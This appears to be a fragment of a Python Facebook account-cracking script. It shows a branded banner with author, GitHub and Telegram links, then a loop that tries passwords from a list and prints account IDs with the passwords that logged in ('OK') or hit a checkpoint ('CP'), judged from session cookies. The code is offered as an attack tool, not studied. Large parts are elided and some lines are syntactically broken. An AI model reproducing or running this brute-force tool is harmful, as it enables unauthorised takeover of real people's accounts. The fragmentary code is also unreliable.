...
`-------'        `--'  `--'       `--'  `--'       `------'  `-----'    `--'  `-----'     
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   :ASRAF-MAHDI
	print("%s║%s  Github   : https://github.com/D-N-H-BOYS1
	print("%s║%s  Telegram : https://t.me/dnhboys1
	print("%s║%s  Version  : %s3.0                          
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [D-N-H-BOYS-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [D-N-H-BOYS-CP] '+uidx+' | '+pasw+'\033[0;97m')
